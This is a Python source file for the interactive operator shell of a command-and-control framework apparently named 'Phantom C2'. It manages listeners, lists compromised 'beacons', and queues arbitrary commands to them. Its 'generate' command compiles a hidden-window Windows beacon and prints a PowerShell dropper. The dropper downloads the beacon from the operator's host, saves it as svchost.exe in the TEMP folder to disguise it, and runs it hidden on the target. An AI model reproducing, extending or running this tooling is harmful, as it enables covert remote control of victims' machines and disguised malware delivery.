import cmd
import sys
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from datetime import datetime

from phantom.core.c2_server import server_instance, c2_state
from phantom.utils.notifier import notifier

console = Console()

def build_c2_banner():
    return r"""
[bold purple]
  ██████╗██████╗     ██████╗ ██████╗ ██████╗ ███████╗
 ██╔════╝╚════██╗   ██╔════╝██╔═══██╗██╔══██╗██╔════╝
 ██║      █████╔╝   ██║     ██║   ██║██████╔╝█████╗  
 ██║     ██╔═══╝    ██║     ██║   ██║██╔══██╗██╔══╝  
 ╚██████╗███████╗██╗╚██████╗╚██████╔╝██║  ██║███████╗
  ╚═════╝╚══════╝╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
[/bold purple]
  [dim]──────────────────────────────────────────────────────────[/dim]
  [bold purple]Phantom C2 Operations Center[/bold purple]  [dim]v1.0.0[/dim]
  [dim]Secure Encrypted Asynchronous Communications[/dim]
"""

class C2Shell(cmd.Cmd):
    intro = ""
    prompt = "[bold purple]C2[/bold purple] > "

    def __init__(self):
        super().__init__()
        self.active_beacon = None

    def preloop(self):
        console.print(build_c2_banner())
        notifier.status("C2 Shell initialized. Type 'help' for commands.")

    def postcmd(self, stop, line):
        if self.active_beacon:
            self.prompt = f"[bold purple]C2[/bold purple] ([cyan]{self.active_beacon}[/cyan]) > "
        else:
            self.prompt = "[bold purple]C2[/bold purple] > "
        return stop

    def do_listeners(self, arg):
        """listeners [start <port> | stop]"""
        parts = arg.split()
        if not parts:
            if server_instance.thread and server_instance.thread.is_alive():
                console.print(f"[*] Listener [green]ACTIVE[/green] on port {server_instance.port}")
            else:
                console.print("[*] Listener [red]INACTIVE[/red]")
            return

        action = parts[0]
        if action == "start":
            port = int(parts[1]) if len(parts) > 1 else 443
            server_instance.port = port
            server_instance.start()
            notifier.success(f"Started listener on port {port}")
        elif action == "stop":
            server_instance.stop()
            notifier.success("Stopped listener")
        else:
            notifier.error("Usage: listeners [start <port> | stop]")

    def do_beacons(self, arg):
        """beacons - list active beacons"""
        beacons = c2_state.get_beacons()
        if not beacons:
            notifier.warn("No active beacons.")
            return

        table = Table(title="Active Beacons", border_style="purple")
        table.add_column("ID", style="cyan")
        table.add_column("IP Address", style="green")
        table.add_column("Last Seen", style="yellow")
        
        for bid, info in beacons.items():
            table.add_row(bid, info.get("ip", "Unknown"), info.get("last_seen", "Never"))
            
        console.print(table)

    def do_interact(self, arg):
        """interact <beacon_id> - drop into beacon interaction mode"""
        bid = arg.strip()
        beacons = c2_state.get_beacons()
        if not bid or bid not in beacons:
            notifier.error("Invalid or missing Beacon ID.")
            return
        
        self.active_beacon = bid
        notifier.success(f"Interacting with beacon {bid}")

    def do_back(self, arg):
        """back - return to main C2 shell from interaction mode"""
        if self.active_beacon:
            self.active_beacon = None
            notifier.success("Returned to global C2 context.")
        else:
            notifier.warn("Already in global context.")

    def default(self, line):
        """Execute a command on the active beacon"""
        if not self.active_beacon:
            notifier.error("No active beacon. Use 'interact <beacon_id>' first.")
            return

        # Queue the task
        task_id = c2_state.queue_task(self.active_beacon, line)
        notifier.info(f"Task queued. ID: {task_id}")

    def do_results(self, arg):
        """results - show results for the active beacon"""
        if not self.active_beacon:
            notifier.error("No active beacon. Use 'interact <beacon_id>' first.")
            return

        results = c2_state.get_results(self.active_beacon)
        if not results:
            notifier.warn("No results available for this beacon.")
            return

        for res in results:
            console.print(f"\n[bold cyan]--- Result for Task: {res['task_id']} ---[/]")
            console.print(res["output"])

    def do_generate(self, arg):
        """generate - Generate an automated PowerShell dropper for the Beacon"""
        import os, subprocess
        from phantom.utils.network import get_lhost
        
        beacon_dir = os.path.join(os.path.dirname(__file__), "..", "payloads", "beacon")
        beacon_exe = os.path.join(beacon_dir, "beacon.exe")
        
        if not os.path.exists(beacon_exe):
            console.print("[yellow][*] Beacon executable not found. Attempting to compile...[/yellow]")
            try:
                if os.name == 'nt':
                    # Try MSVC
                    subprocess.run(
                        ["cl", "/EHsc", "/O2", "/std:c++17", "src/main.cpp", "/Fe:beacon.exe", "/link", "winhttp.lib", "bcrypt.lib", "ws2_32.lib", "/SUBSYSTEM:WINDOWS"],
                        cwd=beacon_dir, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                else:
                    # Try MinGW
                    subprocess.run(
                        ["x86_64-w64-mingw32-g++", "-std=c++17", "-O2", "-s", "-o", "beacon.exe", "src/main.cpp", "-lwinhttp", "-lbcrypt", "-lws2_32", "-static"],
                        cwd=beacon_dir, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                    )
                notifier.success("Beacon compiled successfully.")
            except Exception as e:
                notifier.error(f"Failed to auto-compile beacon: {e}")
                console.print(f"[dim]Please compile manually in {beacon_dir}[/dim]")
                return

        host = get_lhost()
        port = server_instance.port if (server_instance.thread and server_instance.thread.is_alive()) else 443
        url = f"http://{host}:{port}/api/v1/payload"
        
        ps1 = f"Invoke-WebRequest -Uri {url} -OutFile $env:TEMP\\svchost.exe; Start-Process $env:TEMP\\svchost.exe -ArgumentList '{host} {port}' -WindowStyle Hidden"
        
        console.print(Panel(ps1, title="PowerShell Dropper", border_style="green"))
        notifier.info("Run the above command on the target to automatically download and execute the beacon.")

    def do_exit(self, arg):
        """exit - Close C2 and return to main Phantom CLI (or exit completely)"""
        console.print("[dim]Stopping listener...[/]")
        server_instance.stop()
        return True

    def do_quit(self, arg):
        return self.do_exit(arg)

def run_c2():
    try:
        shell = C2Shell()
        shell.cmdloop()
    except KeyboardInterrupt:
        print()
        server_instance.stop()
